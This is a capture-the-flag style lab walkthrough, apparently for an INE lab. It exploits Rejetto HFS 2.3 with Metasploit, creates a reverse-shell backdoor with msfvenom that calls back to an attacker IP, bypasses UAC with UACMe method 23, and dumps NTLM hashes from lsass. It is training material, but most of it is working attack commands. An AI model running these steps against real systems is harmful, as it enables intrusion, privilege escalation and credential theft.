
# Bypassing UAC with UACMe (User Account control)

UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is a part of the local administrator group.

## Convert 32 bit to 64 bit windows
- `sysinfo` __If you get x86/windows it a 32 bit to convert into 64 bit use `pgrep explorer`__
- `pgrep explorer`
- `migrate 2448`

- `net user`
- `net localgroup administrators`



- __`nmap -sV -p 80 demo.ine.local`__

![image1](/Image/UAC/image1.jpg)

__HTTP File Server (HFS) 2.3 is available.__

__Step 1: We will search for an exploit for hfs file server using searchsploit.__

__Command: `searchsploit hfs`__

![image2](/Image/UAC/image2.jpg)

__Step 2: : Rejetto HTTP File Server (HFS) 2.3 is vulnerable to RCE. Exploiting the target server using the Metasploit framework.__

__Commands:__
```
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```


__Step 3: Checking the current user.__

__Commands:__
```
getuid
sysinfo
```
![image0](/Image/UAC/image0.jpg)

___Step 4: We can observe that we are running as an admin user. Migrate the process in explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate the current process to the explorer process.___

__Commands:__
```
ps -S explorer.exe
migrate 2332
```

![image3](/Image/UAC/image3.jpg)


___Step 5: Elevate to the high privilege:___

__Command:__
```
getsystem
```

__We can observe that we do not have permission to elevate privileges.__

__Step 6: Get a windows shell and check if the admin user is a member of the Administrators group.__

__Commands:__
```
shell
net localgroup administrators
```


__The admin user is a member of the Administrators group. However, we do not have the high privilege as of now. We can gain high privilege by Bypassing UAC (User Account Control)__

__We are going to bypass the UAC for admin user with the help of UACMe tool.__

__Step 7: Generating malicious executable using msfvenom and running it on the target machine to gain administrator user privileges.__

> Note: Please make sure that you replace the “10.10.31.2” local IP address with yours.

__Generating malicious executable using msfvenom.__

__Commands:__
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'

file backdoor.exe
```
![image4](/Image/UAC/image4.jpg)

__The UACMe tool located in "/root/Desktop/tools/UACME/" directory.___

__Step 8: Switch the directory to the user’s temp folder and upload the Akagi64.exe and backdoor.exe executable.__

__Commands:__
```
CTRL + C
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls
```
![image5](/Image/UAC/image5.jpg)


__Step 9: Start another msfconsole and run a multi handler.__

__Commands:__
```
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit
```

![image6](/Image/UAC/image6.jpg)




__Step 10: Switch back to the meterpreter and run the Akagi64.exe executable.__

> Note: Please provide the full path of the backdoor executable.

__Commands:__
```
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```
__We are going to use UACMe method number 23:__
```
    Author: Leo Davidson derivative
    Type: Dll Hijack
    Method: IFileOperation
    Target(s): \system32\pkgmgr.exe
    Component(s): DismCore.dll
    Implementation: ucmDismMethod
```

![image7](/Image/UAC/image7.jpg)

__Once we execute the above command we would expect a meterpreter session.__

![image8](/Image/UAC/image8.jpg)

__We have successfully gained high privilege access. Dump the user hashes.__

__Step 11: Migrate in lsass.exe process.__

__Commands:__
```
ps -S lsass.exe
migrate 496
```
![image9](/Image/UAC/image9.jpg)


__Step 12: Dump the hashes.__

__Command:__

`hashdump`

![image10](/Image/UAC/image10.jpg)

_This reveals the flag to us._

Admin NTLM Hash: `4d6583ed4cef81c2f2ac3c88fc5f3da6`


# another method

  - __`search bypassuac`__
```
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set session<id>
set LPORT 4433
set TARGET windows\ x64
exploit
```
 
